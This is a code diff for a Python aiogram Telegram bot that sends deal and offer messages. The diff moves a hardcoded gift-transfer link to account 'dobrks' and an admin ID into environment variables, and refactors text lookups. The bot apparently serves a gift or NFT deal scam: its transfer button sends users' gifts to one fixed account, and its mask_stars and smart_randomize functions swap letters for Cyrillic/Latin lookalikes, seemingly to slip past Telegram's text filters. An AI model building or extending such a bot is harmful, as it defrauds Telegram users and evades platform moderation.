@@ -20,8 +20,9 @@ from aiogram.types import (
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
-ADMIN_ID = 8414654810
+NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=dobrks")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8414654810"))
+
 STAR_EMOJI_ID = "5242644275014951846"
 GRAM_EMOJI_ID = "5193179982775476271"
 CHECK_EMOJI_ID = "5776375003280838798"
@@ -89,7 +90,6 @@ def mask_stars(currency: str) -> str:
         return "Ѕtаrѕ"
     return currency.capitalize()
 
-# Буквы-двойники кириллица → латиница
 CYR_TO_LAT = {
     "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y",
     "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Х": "X", "У": "Y",
@@ -97,7 +97,6 @@ CYR_TO_LAT = {
 }
 
 def smart_randomize(text: str) -> str:
-    """Случайная вероятность + замена только двойников. Теги/ссылки не трогает."""
     probability = random.uniform(0.25, 0.55)
     result = []
     i = 0
@@ -268,8 +267,11 @@ def get_lang(code: str) -> str:
         return "us"
     return c if c in TEXTS else "ru"
 
+def get_texts(lang: str) -> dict:
+    return TEXTS.get(lang, TEXTS["ru"])
+
 def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
-    t = TEXTS[lang]
+    t = get_texts(lang)
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(
@@ -286,10 +288,11 @@ def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
     ])
 
 def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
+    t = get_texts(lang)
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(
-                text=TEXTS[lang]["btn_transfer"],
+                text=t["btn_transfer"],
                 url=NFT_TRANSFER_LINK
             )
         ]
@@ -312,6 +315,7 @@ async def cmd_rep_business(message: types.Message):
         except Exception:
             pass
         return
+
     last_send = now
 
     args = message.text.split()
@@ -344,7 +348,7 @@ async def cmd_rep_business(message: types.Message):
             pass
         return
 
-    t = TEXTS[lang]
+    t = get_texts(lang)
     amount_formatted = format_amount(amount)
     currency_text = mask_stars(currency)
 
@@ -485,7 +489,7 @@ async def process_decline(callback: CallbackQuery):
 
     offer["status"] = "declined"
     lang = offer["lang"]
-    t = TEXTS[lang]
+    t = get_texts(lang)
 
     declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else randomize_all(t['declined'], probability=1.0)
     text = f"{cross_emoji()} {declined_rand}"
